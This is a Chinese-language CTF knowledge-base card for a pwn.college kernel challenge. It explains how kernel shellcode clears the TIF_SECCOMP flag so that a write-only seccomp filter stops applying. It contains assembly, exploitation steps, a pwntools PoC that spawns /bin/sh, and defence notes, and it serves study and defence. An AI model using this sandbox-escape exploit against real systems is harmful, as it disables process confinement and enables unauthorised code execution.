---
id: binary-pwn-kernel-shellcode-clear-tif-seccomp
title: seccomp 逃逸：内核 shellcode 清 TIF_SECCOMP 位
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-shellcode-clear-tif-seccomp
tags:
- kernel
- pwn
- seccomp
- thread-info
- tif-seccomp
- escape
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:50:41+08:00'
  notes: 已对照原文核对代码/地址/偏移与利用链，一致；原文为 pwn.college 教学环境，卡内已标注地址偏移依赖具体内核版本/配置，未复跑 PoC。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-shellcode-clear-tif-seccomp/
draft: false
kb_aliases:
- seccomp 逃逸
- TIF_SECCOMP
- thread_info flags
- pwn.college level 8
- 内核 shellcode 清标志位
---

## 一句话结论

当用户程序安装了只允许 `write` 的 seccomp 过滤、但又能通过已打开的内核设备 fd 执行内核 shellcode 时，可在内核 shellcode 中取 `current`（x86_64 为 `gs:0x15d00`）并把 `thread_info->flags` 的 `TIF_SECCOMP`（bit 8）清零；返回用户态后 seccomp 不再生效，即可 `execve`/读文件/起 shell。

## 原理

- **seccomp 检查点**：系统调用进入内核后，`secure_computing()` 检查 `test_thread_flag(TIF_SECCOMP)`；若置位则运行过滤器，按返回值 ALLOW/ERRNO/TRAP/TRACE/USER_NOTIF/KILL 处理。
- **TIF_SECCOMP 位置**：x86_64 Linux 5.4 的 `thread_info.flags` 中 `TIF_SECCOMP` 为 bit 8；`current` 可通过 `gs:0x15d00` 取得（具体偏移随内核版本/配置变化）。清掉该位后，`secure_computing()` 认为当前线程未启用 seccomp，直接放行系统调用。
- **本题链路**：用户程序打开 `/proc/pwncollege`（fd 3），mmap 0x31337000 为 RWX，读入用户 shellcode，安装 seccomp（除 `write` 外全部 KILL），执行用户 shellcode。用户 shellcode 只能用 `write`：把内核 shellcode 写到 fd 3，内核模块的 `write` 会 `copy_from_user` 到可执行页并调用。
- **内核 shellcode**：
  ```asm
  mov rax, qword ptr gs:0x15d00   ; current / thread_info
  and qword ptr [rax], ~(1<<8)    ; flags &= ~TIF_SECCOMP
  ret
  ```
- **返回后**：seccomp 过滤器不再被检查，用户态可以 `execve("/bin/sh")`；即使 shell 子系统调用被限制，`read line < /flag && echo $line` 这类 shell 内建也可读 flag。
- **为什么可行**：seccomp 是“当前线程标志位 + 过滤器”的软件检查，一旦攻击者能在 ring 0 写 `thread_info`，就能关闭它；seccomp 不是对抗内核代码执行的边界。
- **边界**：需要内核代码执行原语（本例为模块 RWX + write shellcode）；内核版本/配置不同，`current` 偏移、`thread_info` 布局、`TIF_SECCOMP` 位号需按 vmlinux/BTF 核对。

## 触发条件

- 用户程序安装 seccomp 白名单（只允许 `write` 等少数 syscall），但仍能通过已打开的 fd 触发内核模块执行用户提供的 shellcode。
- 内核模块把用户数据写入可执行页并调用（RWX vmalloc）。
- 知道/可推断 `current` 的获取方式与 `TIF_SECCOMP` 位（本题 Linux 5.4.0，`gs:0x15d00`，bit 8）。
- 内核未启用阻止内核代码执行的保护（如模块签名、W^X、hypervisor 限制）。

## 利用步骤

1. 分析用户程序：确认 seccomp 白名单、内核设备 fd（本题 3）、shellcode 映射地址（0x31337000）。
2. 编写用户态 shellcode：用允许的 `write(3, kernel_sc, len)` 把内核 shellcode 写到设备 fd。
3. 编写内核 shellcode：取 `gs:0x15d00`，清 `[rax]` 的 bit 8（`and qword ptr [rax], ~(1<<8)`），`ret`。
4. 把两段 shellcode 拼成 payload 发送给程序；用户 shellcode 执行后内核模块调用内核 shellcode。
5. 返回用户态后执行 `execve("/bin/sh")` 或读 `/flag`；若 execve 仍受限，用已放行的 syscall/shell 内建读文件。
6. 用 `dmesg`/输出验证提权/读取成功。

## PoC

```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
io = process("/challenge/babykernel_level8.0")

payload = asm("""
    xor rax, rax
    xor rdi, rdi
    inc rax
    mov rdi, 3
    mov rdx, 0x100
    lea rsi, [rip + sc]
    syscall

    mov rax, 0x3b          /* execve */
    lea rdi, [rip + binsh]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ret

sc:
    .byte 0x65,0x48,0x8b,0x4,0x25,0x0,0x5d,0x1,0x0,0x48,0x81,0x20,0xff,0xfe,0xff,0xff,0xc3
binsh:
    .ascii "/bin/sh"
""") + b"\x00"

io.sendline(payload)
io.interactive()
```

说明：内核 shellcode 的 `gs:0x15d00`/bit 8 来自原文 Linux 5.4.0 环境；不同内核需重算偏移。PoC 未在本机复跑。

## 变体与关联

- **直接清 TIF_SECCOMP**：`current->thread_info.flags &= ~(1<<TIF_SECCOMP)`；也可改 `seccomp.mode`/过滤器链表（更复杂）。
- **seccomp 其他绕过**：`openat2`/`pipe`/`splice` 读文件、`fcntl`/`dup2` 重映射 fd、纯 shell 内建读文件；参见 [[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]、[[binary-pwn-sandbox-escape-seccomp-write-fd-fcntl-dup2]]。
- **内核版本差异**：`current` 可能通过 `gs:current_task` 或 `percpu` 获取；`thread_info` 可能嵌入 `task_struct` 起始；用 vmlinux/BTF 核对。
- **关联**：[[binary-pwn-kernel-rwx-vmalloc-user-shellcode-exec]]（内核 shellcode 执行原语）。

## 检测与防御

- **不要依赖 seccomp 对抗内核代码执行**：seccomp 只限制系统调用入口；一旦内核代码可写 `thread_info`，过滤器可被关闭。
- **内核加固**：W^X、模块签名、KASLR、SMEP/SMAP、`CONFIG_SECCOMP_FILTER` 与 LSM 组合；限制可加载模块和 `/proc` 设备。
- **检测**：监控内核模块 RWX 页/可执行 vmalloc、异常 ioctl/write、seccomp 安装后的可疑 fd 写入；对 `TIF_SECCOMP` 篡改需要内核完整性监控（如 IMA/BPF LSM）。
- **边界**：本卡是 CTF/教学场景；真实系统应防止任意内核代码执行，而不是只靠 seccomp。
